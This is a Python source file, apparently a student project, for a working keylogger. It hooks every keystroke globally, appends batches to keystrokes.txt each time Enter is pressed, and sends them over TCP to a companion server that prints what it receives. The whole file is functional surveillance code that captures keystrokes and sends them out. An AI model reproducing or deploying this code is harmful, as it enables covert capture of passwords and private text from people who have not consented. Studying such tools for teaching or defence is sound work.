import keyboard
import keylogger
import socket
import getPortAndIP


def onKeyEvent(event, keylogger_instance, tcpSocket=None):
    """
    Checks for keyboard event where the enter key is pressed. Upon this event, endAndRestartKeyLogger() is called
    which returns the keys pressed. These keys are then written to the text file where there is an emphasis on where
    the "enter" key was pressed.
    """
    if event.event_type == keyboard.KEY_DOWN and event.name == 'enter':
        keystrokes = endAndRestartKeylogger(keylogger_instance)
        try:
            file = open("keystrokes.txt", "a")
            file.write(keystrokes + "\nPRESSED ENTER HERE\n\n")  # emphasis in text file where "enter" is pressed
            file.close()

            if tcpSocket:
                keys = f"Keys:\n{keystrokes}"
                tcpSocket.send(bytearray(str(keys), encoding='utf-8'))
                print("Sent keystrokes over network.\n")
        except Exception as ex:  # error handling
            print(f"Error writing to file or sending over network: {ex}")
        return keystrokes


def endAndRestartKeylogger(keylogger_instance):
    """
    Stops recording, records the keys pressed and stores them as a string. Prints the keys to terminal. Restarts the
    recording. Returns the keys pressed.
    """
    stoppedRecording = keylogger_instance.stopRecording()
    keysPressed = keylogger_instance.getTypedStrings(stoppedRecording)
    keystrokes = keylogger_instance.writeKeysPressed(keysPressed)
    print(keystrokes)
    keylogger_instance.startRecording()
    return keystrokes


def runServer():  # sets up server to receive the logged keys
    """
    Sets up a server to receive the logged keys over
    """
    serverIP = getPortAndIP.getIP()  # get IP from user to use for server
    myTCPSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    myTCPSocket.bind((serverIP, 1024))  # set serverIP to private IP address if going through local network, 1024 = port
    myTCPSocket.listen(5)  # 5 is number of unaccepted connections the system will allow before refusing new connections
    print("Server is listening...")
    incomingSocket, incomingAddress = myTCPSocket.accept()
    try:
        while True:
            data = incomingSocket.recv(1024)  # receive data from client
            incomingMessage = data.decode('utf-8')  # decodes b/c of utf-8
            print(f"Received {incomingMessage}")
    except KeyboardInterrupt:
        print("\nClient shutting down...")
    except ConnectionResetError:
        print("Connection was reset by the client")
    finally:
        if 'incomingSocket' in locals():  # makes sure incomingSocket is closed
            incomingSocket.close()
        myTCPSocket.close()  # terminates connection with client & prevents connection leak even if an exception occurs
        print("Server closed")


def runClient():
    """
    Sets up a client to send the logged keys over
    """
    serverIP = getPortAndIP.getIP()
    serverPort = getPortAndIP.getPort()
    myTCPSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        myTCPSocket.connect((serverIP, serverPort))
        print(f"Connected to server at {serverIP}:{serverPort}")

        keylogger_instance = keylogger.Keylogger()

        keylogger_instance.startRecording()

        keyboard.hook(
            lambda event: onKeyEvent(event, keylogger_instance, myTCPSocket))  # sets up global listener for keys

        print("Keylogger is running. Press 'enter' to send keystrokes.")
        keyboard.wait()  # prevents spam

        # send any leftover keystrokes before closing
        final_keystrokes = endAndRestartKeylogger(keylogger_instance)
        if final_keystrokes:
            message = f"Final keys:\n{final_keystrokes}"
            myTCPSocket.send(bytearray(str(message), encoding='utf-8'))

        keyboard.unhook_all()  # ensures proper cleanup
    except KeyboardInterrupt:
        print("\nClient shutting down...")
    except ConnectionRefusedError:  # exception when you try to run the client before the server
        print("Connection refused. Make sure the server is running.")
    except ConnectionResetError:
        print("Connection was reset by the server")
    finally:
        # Make sure we close the socket even if an exception occurs
        myTCPSocket.close()  # terminates connection with server & prevents connection leak even if an exception occurs
        print("Client connection closed")


def main():
    userChoice = ""
    while userChoice != 1 and userChoice != 2:  # prompts user to set up server or keylogger and client
        userChoice = input("Choose an option: "
                           "\n\t1) Run server to receive logged keys "
                           "\n\t2) Start keylogger and Run client to send logged keys"
                           "\n\t3) Quit\n")
        if userChoice == "1":
            print("Starting server...\n")
            runServer()
        elif userChoice == "2":
            print("Starting client...\n")
            runClient()
        elif userChoice == "3":
            break
        else:
            continue


main()
